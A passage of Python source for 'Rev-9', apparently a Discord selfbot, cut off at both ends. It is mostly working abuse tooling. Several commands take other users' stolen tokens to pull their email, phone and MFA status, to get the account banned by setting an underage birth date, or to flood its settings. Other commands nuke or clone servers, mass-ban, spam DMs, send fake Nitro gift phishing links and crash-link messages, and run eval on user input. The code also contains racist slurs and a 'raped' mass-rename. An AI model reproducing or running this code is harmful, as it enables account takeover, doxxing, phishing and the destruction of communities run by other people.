        requests.post('https://discordapp.com/api/v8/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v8/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v8/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break   

@Rev9.command()
async def masslogin(ctx, choice = None): # b'\xfc'
    await ctx.message.delete()
    _masslogin(choice)


@Rev9.command()
async def tdox(ctx, token: str=None): # b'\xfc'
    await ctx.message.delete()
    try:
        async with httpx.AsyncClient() as client:
            userinfo = await client.get('https://canary.discordapp.com/api/v8/users/@me', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            userdata = json.loads(userinfo.content)
            try:
                userdata['premium_type']
            except Exception:
                dnitro ="None"
            else:
                if userdata['premium_type'] == 1:
                    dnitro ="Nitro Classic"

                elif userdata['premium_type'] == 2:
                    dnitro ="Nitro"

            username = userdata['username']
            discriminator = userdata['discriminator']
            avatar_url = f"https://cdn.discordapp.com/avatars/{userdata['id']}/{userdata['avatar']}.jpg"
            email = userdata['email']
            phone = userdata['phone']
            verified = userdata['verified']
            locale = userdata['locale']
            mfa = userdata['mfa_enabled']
            nsfw = userdata['nsfw_allowed']
            embed = discord.Embed(color=000000, title='User Information', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
            embed.add_field(name=f'Username', value=f'{username}#{discriminator}', inline=False)
            embed.add_field(name=f'Email', value=email, inline=False)
            embed.add_field(name=f'Phone', value=phone, inline=False)
            embed.add_field(name=f'Nitro', value=dnitro, inline=False)
            embed.add_field(name=f'Verified', value=verified, inline=False)
            embed.add_field(name=f'Locale', value=locale, inline=False)
            embed.add_field(name=f'MFA Enabled', value=mfa, inline=False)
            embed.add_field(name=f'NSFW Allowed', value=nsfw, inline=False)
            embed.set_thumbnail(url=avatar_url)
            embed.set_footer(text="Rev-9")
            await ctx.send(embed=embed, delete_after=deltime)

    except Exception:
        return

@Rev9.command()
async def delwebhook(ctx, webhook: str=None): # b'\xfc'
    await ctx.message.delete()
    try:
        while True:
            async with httpx.AsyncClient() as client:
                await client.delete(webhook)
                embed= discord.Embed(color=000000, title="Rev-9 webhook deleter", description=f"Successfully deleted {webhook}")
                embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
                embed.set_footer(text=promote)
                await ctx.send(embed=embed, delete_after=deltime)
    except Exception:
        return

@Rev9.command()
async def rule34(ctx): # b'\xfc'
    await ctx.message.delete()
    try:
        request = requests.get(f'http://rule34.xxx/index.php?page=post&s=random')
        soup = BeautifulSoup(request.content, 'html.parser')
        link = soup.find(id="image").get("src")
        embed= discord.Embed(color=000000, title=f'Rule34', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=promote)
        await ctx.send(embed=embed, delete_after=deltime)
    except Exception:
        return

@Rev9.command()
async def phcomment(ctx, *, text: str=None): # b'\xfc'
    await ctx.message.delete()
    image_url = ctx.author.avatar_url
    request = requests.get(f'https://nekobot.xyz/api/imagegen?type=phcomment&image={image_url}&username={ctx.author.name}&text={text}')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=000000, title=f'PornHub Comment', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def clyde(ctx, *, text: str=None): # b'\xfc'
    await ctx.message.delete()
    request = requests.get(f'https://nekobot.xyz/api/imagegen?type=clyde&text={text}')
    data = request.json()
    link = data['message']
    embed= discord.Embed(color=000000, title=f'Clyde', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    embed.set_image(url=link)
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command(pass_context=True)
async def inftyping(ctx): # b'\xfc'
    try:
        await ctx.message.delete()
        async with ctx.channel.typing():
            await asyncio.sleep(3600)
    except Exception:
        return

@Rev9.command()
async def dumpserver(ctx): # b'\xfc'
    await ctx.message.delete()
    await Rev9.create_guild(f'stolen-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Rev9.guilds:
        if f'stolen-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:                
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@Rev9.command()
async def dmall(ctx, *, msg: str=None): # b'\xfc'
    await ctx.message.delete()
    if msg is not None:
        for member in ctx.guild.members:
            if member is not ctx.author:
                try:
                    await member.send(msg)
                except Exception as e:
                    print(e)


@Rev9.command(pass_context=True, aliases=["auto"])
async def autoname(ctx): # b'\xfc'
	await ctx.message.delete()

	while True:
		name = ""

		for letter in Rev9.user.name:
			name = name + letter
			await ctx.message.author.edit(nick=name)

@Rev9.command()
async def massrole(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="Marci on top", color=RandomColor())
        except:
            return    

@Rev9.command()
async def masschannel(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="rev9 was here")
        except:
            return

@Rev9.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@Rev9.command() 
async def delroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@Rev9.command()
async def removestatus(ctx): # b'\xfc'
    await ctx.message.delete()
    try:
        game = discord.Activity(type=-1)
        await Rev9.change_presence(activity=game)
        await print(f"Status removed")
    except Exception as e:
        await print(f"Error: {e}")

@Rev9.command()
async def usdtobtc(ctx, num:int=None): # b'\xfc'
    await ctx.message.delete()
    if num is None:
        await print("Invalid format xd")
    else:
        with requests.session() as ses:
            resp = ses.get('https://blockchain.info/ticker')
            pret = int(resp.json()['USD']['last'])
            final = num/pret
            try:
                embed= discord.Embed(color=000000, title="USD -> BTC", description=f"USD: {num}\n BTC: {final}")
                embed.set_thumbnail(url="https://i.imgur.com/GCPDIYU.png")
                embed.set_footer(text="Rev-9")
                await ctx.send(embed=embed, delete_after=deltime)
            except discord.HTTPException:
                await print(f"USD -> BTC:\n\nUSD: {num}\n BTC: {final}")

@Rev9.command()
async def btctousd(ctx, num:int=None): # b'\xfc'
    await ctx.message.delete()
    if num is None:
        await print("Invalid format xd")
    else:
        with requests.session() as ses:
            resp = ses.get('https://blockchain.info/ticker')
            pret = int(resp.json()['USD']['last'])
            final = num*pret
            try:
                embed= discord.Embed(color=000000, title="BTC -> USD", description=f"BTC: {num}\n USD: {final}")
                embed.set_thumbnail(url="https://i.imgur.com/HHSzzNz.png")
                embed.set_footer(text="Rev-9")
                await ctx.send(embed=embed, delete_after=deltime)
            except discord.HTTPException:
                await print(f"BTC -> USD:\n\nBTC: {num}\n USD: {final}")

@Rev9.command()
async def dox(ctx, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    emaillist = random.choice(["gmx.de", "yahoo.com", "protonmail.com", "gmail.com"])
    nr = random.choice(range(0,9999))
    ip = random.choice(["127.0.0.1", "192.168.0.1", "192.168.0.101"])
    country = random.choice(['Niger', 'Niggeria', "Jamaica", "Africa"])
    if user is None:
        await print("Please mention a member")
    else:
        try:
            embed= discord.Embed(color=000000, title=f"Doxing in progress %0",description="Getting his email and address")
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text="Rev-9")
            a = await ctx.send(embed=embed)
            await asyncio.sleep(2)
            embed= discord.Embed(color=000000, title=f"Doxing in progress %50",description="Getting ip and stuffs")
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text="Rev-9")
            await a.edit(embed=embed)
            await asyncio.sleep(2)
            embed= discord.Embed(color=000000, title=f"Doxing in progress %100",description="Grabbing their passwords")
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text="Rev-9")
            await a.edit(embed=embed)
            await asyncio.sleep(2)
            embed= discord.Embed(color=000000, title=f"Dox of {user.name}")
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.add_field(name=f'Email', value=f'{user.name}{nr}@{emaillist}', inline=False)
            embed.add_field(name=f'IP', value=f'{ip}', inline=False)
            embed.add_field(name=f'Country', value=f'{country}', inline=False)
            embed.set_footer(text="Rev-9")
            await a.edit(embed=embed, delete_after=deltime)
            await asyncio.sleep(2)
        except discord.HTTPException:
            a = await ctx.send("Doxing in progress %0 - Getting his email and address")
            await asyncio.sleep(2)
            await a.edit(content="Doxing in progress %50 - Getting ip and stuffs")
            await asyncio.sleep(2)
            await a.edit(content="Doxing in progress %100 - Grabbing their passwords")
            await asyncio.sleep(2)
            await a.edit(content=f"Dox of {user.name}:\n\nEmail: {user.name}{nr}@{emaillist}\nIP: {ip}\nCountry: {country}")


@Rev9.command() 
async def reall(ctx): # b'\xfc'
        await ctx.message.delete()
        rename_to = "raped"
        i = 0
        for user in list(ctx.guild.members):
            try:
                i += 1
                await user.edit(nick=f"{rename_to}{i}")
                print(
                f"{Fore.GREEN}[-]NICK > {Fore.RESET}Old name: {user.name} | New name: {rename_to} | Guild: {ctx.guild.name}"
                )
                pass
            except Exception as e:
                pass
                print(
                f"{Fore.RED}[-]NICK > {Fore.RESET}{user.name} has NOT been renamed to {rename_to}{i} in {ctx.guild.name}\nError > {e}"
                )
        print(f"{Fore.RED}[-]NICK > {Fore.RESET}Action Completed: rall")



@Rev9.command()
async def banall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member is not ctx.author:
            try:
                await member.ban()
            except Exception:
                return

@Rev9.command()
async def massunban(ctx): # b'\xfc'
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await ctx.guild.unban(user=users.user)
        except:
            pass

@Rev9.command()
async def whoisbanned(ctx): # b'\xfc'
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await ctx.send(f"{users.user}")
        except:
            return

@Rev9.command(usage='fakeipgen', description='Fake IP Generator')
async def ipresolve(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    ip = ''
    for i_ in range(4):
        number = random.randint(0, 255)
        ip += f'{number}.'
    embed = discord.Embed(title=f"Resolved IP", description=f"**{ip[:-1]}**", colour=0x0000)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    embed.set_footer(text="Rev-9")
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def fnitro(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    embed = discord.Embed(title=f"Nitro", url="https://discordgift.site/bnXnA5ZSAix7eRyZ", description=f"Expires in 48 hours", color=0xcb82d0)
    embed.set_thumbnail(url='https://discordgift.site/nitro.png')
    embed.set_author(name=f"A WILD GIFT APPEARS!")
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def fclassic(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    embed = discord.Embed(title=f"Nitro Classic", url="https://discordgift.site/bnXnA5ZSAix7eRyZ", description=f"Expires in 48 hours", color=0x92a7e6)
    embed.set_thumbnail(url='https://discordgift.site/classic.png')
    embed.set_author(name=f"A WILD GIFT APPEARS!")
    await ctx.send(embed=embed)

@Rev9.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    for _i in range(amount):
        #await asyncio.sleep(7)
        await ctx.send(message)

@Rev9.command()
async def advspam(ctx, wait: int, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    for _i in range(amount):
        await asyncio.sleep(wait)
        await ctx.send(message)

@Rev9.command()
async def dm(ctx, user : discord.Member, *, message): # b'\xfc'
    await ctx.message.delete()
    user = Rev9.get_user(user.id)
    if ctx.author.id == Rev9.user.id:
        return
    else:
        try:
            await user.send(message) 
        except:
            pass       

@Rev9.command(name='get-color', aliases=['color', 'colour', 'sc'])
async def _get_color(ctx, *, color: discord.Colour): # b'\xfc'
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'Showing Color: {str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em, delete_after=deltime) 

@Rev9.command()
async def tinyurl(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role): # b'\xfc'
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(0.2)
        except:
            break

@Rev9.command()
async def em(ctx, title, *, description):
  await ctx.message.delete()
  embed=discord.Embed(title=title, description=description)
  embed.set_footer(text=promote)
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def emt(ctx, title):
  await ctx.message.delete()
  embed=discord.Embed(title=title)
  embed.set_footer(text=promote)
  await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def gayrate(ctx, *, gay):
    await ctx.message.delete()
    gayass = gay
    percent = random.randint(0, 100)
    embed = discord.Embed(title=":gay_pride_flag: Gay Percentage Machine :gay_pride_flag:", description=f"{gayass} is {percent}% Gay")
    embed.set_footer(text="Rev-9")
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command(name='8ball')
async def _ball(ctx, *, question): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'That is a resounding no',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
      'Maybe',
      'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))

#@Rev9.command()
#async def joke(ctx):  # b'\xfc'
#    await ctx.message.delete()
#    headers = {
#        "Accept": "application/json"
#    }
#    async with aiohttp.ClientSession()as session:
#        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
#            r = await req.json()
#    await ctx.send(r["joke"])

@Rev9.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1 
            channel = Rev9.get_channel(int(channelid))
            await channel.send('!d bump')           
            print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Rev9.command()
async def tts(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))

@Rev9.command()
async def upper(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message.upper()
    await ctx.send(message)

@Rev9.command(aliases=['guildpfp'])
async def guildicon(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def serverinfo(ctx, server_id: int=None): # b'\xfc'
    await ctx.message.delete()
    if server_id is None:
        server = ctx.guild
    else: 
        server = discord.utils.get(ctx.bot.guilds, id=server_id)
    total_users = len(server.members)
    online = len([m for m in server.members if m.status != discord.Status.offline])
    text_channels = len([x for x in server.channels if isinstance(x, discord.TextChannel)])
    voice_channels = len([x for x in server.channels if isinstance(x, discord.VoiceChannel)])
    categories = len(server.channels) - text_channels - voice_channels
    passed = (ctx.message.created_at - server.created_at).days
    created_at = "Since {} ({} days ago)".format(server.created_at.strftime("%d %b %Y %H:%M"), passed)

    data = discord.Embed(description=created_at, color=000000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
    data.add_field(name="Region", value=str(server.region))
    data.add_field(name="Users", value="{}/{}".format(online, total_users))
    data.add_field(name="Text Channels", value=text_channels)
    data.add_field(name="Voice Channels", value=voice_channels)
    data.add_field(name="Categories", value=categories)
    data.add_field(name="Roles", value=len(server.roles))
    data.add_field(name="Verification Level", value=server.verification_level)
    data.add_field(name="Owner", value=str(server.owner))
    data.add_field(name="Server ID", value=str(server.id))
    data.set_footer(text="Rev-9")
    data.set_author(name=server.name, icon_url=None or server.icon_url)
    data.set_thumbnail(url=server.icon_url)
    await ctx.send(embed=data, delete_after=deltime)

@Rev9.command()
async def userinfo(ctx, *, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    if ctx.guild is not None:
        server = ctx.guild
        if user is None:
            member = ctx.author
        else:
            member = user
        avi = member.avatar_url
        roles = sorted(member.roles, key=lambda c: c.position / -1)

        rolenames = ' '.join([r.mention for r in roles if r.name != '@everyone']) or 'None'
        member_number = sorted(server.members, key=lambda m: m.joined_at).index(member) + 1

        resp = requests.get(f'https://canary.discordapp.com/api/v8/users/{member.id}/profile', headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
        j = resp.json()
        premium_since = j['premium_since']

        channel = None
        streaming = False
        if member.voice is not None:
            channel = member.voice.channel
            streaming = member.voice.self_stream

        em = discord.Embed(color=000000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        em.add_field(name='Nickname', value=member.nick, inline=True)
        em.add_field(name='Member Number',value=str(member_number),inline = True)
        em.add_field(name='Account Created', value=member.created_at.__format__('%A, %d. %B %Y'))
        em.add_field(name='Join Date', value=member.joined_at.__format__('%A, %d. %B %Y'))
        em.add_field(name='Roles', value=rolenames, inline=True)
        em.add_field(name='Top Role', value=member.top_role.mention, inline=True)
        em.add_field(name='User ID', value=str(member.id), inline=True)
        em.add_field(name='Nitro Subscription Since', value=premium_since, inline=True)
        em.add_field(name='Is On Mobile', value=member.is_on_mobile(), inline=True)
        em.add_field(name='Is In Voice Channel', value=channel, inline=True)
        em.add_field(name='Is Streaming', value=streaming, inline=True)
        em.set_footer(text="Rev-9")
        em.set_thumbnail(url=avi)
        em.set_author(name=member, icon_url=server.icon_url)
        await ctx.send(embed=em, delete_after=deltime)
    else:
        if user is None:
            member = ctx.author
        else:
            member = user
        avi = member.avatar_url
        resp = requests.get(f'https://canary.discordapp.com/api/v8/users/{member.id}/profile', headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
        j = resp.json()
        premium_since = j['premium_since']

        em = discord.Embed(color=000000, timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        em.add_field(name='Account Created', value=member.created_at.__format__('%A, %d. %B %Y'))
        em.add_field(name='Is On Mobile', value=member.is_on_mobile(), inline=True)
        em.add_field(name='User ID', value=str(member.id), inline=True)
        em.add_field(name='Nitro Subscription Since', value=premium_since, inline=True)
        em.set_footer(text=promote)
        em.set_thumbnail(url=avi)
        em.set_author(name=member, icon_url=avi)
        await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def pokedex(ctx, pokemon: str=None): # b'\xfc'
    await ctx.message.delete()
    if pokemon is not None:
        resp = requests.get(f'https://some-random-api.ml/pokedex?pokemon={pokemon}')
        j = resp.json()
        embed= discord.Embed(color=000000, title=f'Pokxc3xa9dex Information about {j["name"]}', description=f'{j["description"]}', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url=f'{j["sprites"]["animated"]}')
        embed.add_field(name=f'Name', value=f'{j["name"]}', inline=True)
        embed.add_field(name=f'ID', value=f'{j["id"]}', inline=True)
        embed.add_field(name=f'Species', value=f'{j["species"][0]}', inline=True)
        embed.add_field(name=f'Type', value=f'{j["type"][0]}', inline=True)
        embed.add_field(name=f'Height', value=f'{j["height"]}', inline=True)
        embed.add_field(name=f'Weight', value=f'{j["weight"]}', inline=True)
        embed.add_field(name=f'Generation', value=f'{j["generation"]}', inline=True)
        embed.set_footer(text="Rev-9")
        await ctx.send(embed=embed, delete_after=deltime)
    else:
        print(Fore.RED + 'Missing arguments')

@Rev9.command()
async def urbandict(ctx, *, term: str=None): # b'\xfc'
    await ctx.message.delete()
    if term is not None:
        response = requests.get(f'https://api.urbandictionary.com/v0/define?term={term}')
        data = response.json()

        word = data['list'][0]['word']
        link = data['list'][0]['permalink']
        definition = data['list'][0]['definition'].replace('[', '').replace(']', '')
        example = data['list'][0]['example'].replace('[', '').replace(']', '')

        embed= discord.Embed(color=000000, title=f'Urban Dictionary', timestamp=datetime.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        embed.add_field(name=f'Word', value=f'[{word}]({link})', inline=False)
        embed.add_field(name=f'Definition', value=f'{definition}', inline=False)
        embed.add_field(name=f'Example', value=f'{example}', inline=False)
        embed.set_footer(text="Rev-9")
        await ctx.send(embed=embed, delete_after=deltime)
    else:
        print(Fore.RED + 'Missing arguments')

@Rev9.command()
async def bantoken(ctx, token: str=None): # b'\xfc'
    await ctx.message.delete()
    try:
        async with httpx.AsyncClient() as client:
            await client.patch('https://discordapp.com/api/v6/users/@me', json={'date_of_birth': "2017-2-11"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
    except Exception:
        return

@Rev9.command()
async def tokenlight(ctx, token: str=None): # b'\xfc'
    await ctx.message.delete()
    try:
        while True:
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "light"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "dark"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
    except Exception:
        return

@Rev9.command()
async def bsod(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('<ms-cxh-full://0>')

@Rev9.command()
async def hiddeneveryone(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('Hello||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||@everyone')

@Rev9.command()
async def invping(ctx, user: discord.Member=None, *, message: str='Hi'): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(f'{message}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||<@{user.id}>')

@Rev9.command(name='saveblocked', aliases=['blockedsave'])
async def _backup_f(ctx): # b'\xfc'
    await ctx.message.delete()
    for block in Rev9.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/Blocked.txt', 'a+') as f: 
            f.write(blocklist+"\n" )

@Rev9.command()
async def msgedit(message): # b'\xfc'
    edit_to = message.content[len(prefix)+8:]
    messages = await message.channel.history(limit=None).flatten()
    if isinstance(message.channel, discord.DMChannel):
        print(
            f"{Fore.YELLOW}[{datetime.datetime.now()} UTC]{Fore.WHITE}\nEditing all messages with @{message.channel.recipient} to {edit_to}..."
        )
    if isinstance(message.channel, discord.GroupChannel):
        print(
            f"{Fore.YELLOW}[{datetime.datetime.now()} UTC]{Fore.WHITE}\nEditing all messages in {message.channel.name} to {edit_to}..."
        )
    if isinstance(message.channel, discord.TextChannel):
        print(
            f"{Fore.YELLOW}[{datetime.datetime.now()} UTC]{Fore.WHITE}\nEditing all messages in {message.channel.name} to {edit_to}..."
        )
    for message in messages:
        try:
            await message.edit(content=f"{edit_to}")
        except:
            pass
    print(
        f"{Fore.GREEN}Finished editing all messages to {Fore.WHITE}{edit_to}"
    )


@Rev9.command()
async def firstmessage(ctx): # b'\xfc'
    await ctx.message.delete()
    first_message = (await ctx.channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content, colour=0x0000)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    embed.set_author(name = f'{first_message.author.name}#{first_message.author.discriminator}', icon_url = first_message.author.avatar_url)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command(aliases=["calc", "math"])
async def calculate(ctx, *, operation=None): # b'\xfc'
    await ctx.message.delete()
    try:
        operation = eval(operation)
    except ZeroDivisionError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Division by zero!**")
        return
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Expression could not be calculated!")
        return
    await ctx.send(f"**The answer to your calculation is: **`{operation}`**!**", delete_after=deltime)

@Rev9.command()
async def newprefix(ctx, prefix): # b'\xfc'
    await ctx.message.delete()
    Rev9.command_prefix = str(prefix)

@Rev9.command(pass_context=True)
async def cyclenick(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)
    
@Rev9.command()
async def stopcyclenick(ctx): # b'\xfc'
    await ctx.message.delete()
    global cycling
    cycling = False

@Rev9.command()
async def acceptrequests(ctx): # b'\xfc'
    await ctx.message.delete()
    for relationship in Rev9.user.relationships:
        if relationship == discord.RelationshipType.incoming_request:
            await relationship.accept()

@Rev9.command()
async def bloackall(ctx): # b'\xfc'
    await ctx.message.delete()
    for relationship in Rev9.user.relationships:
        if relationship is discord.RelationshipType.friend:
            await relationship.block()

@Rev9.command()
async def ignorerequests(ctx): # b'\xfc'
    await ctx.message.delete()
    for relationship in Rev9.user.relationships:
        if relationship is discord.RelationshipType.incoming_request:
            await relationship.delete()

@Rev9.command()
async def removefriends(ctx): # b'\xfc'
    await ctx.message.delete()
    for relationship in Rev9.user.relationships:
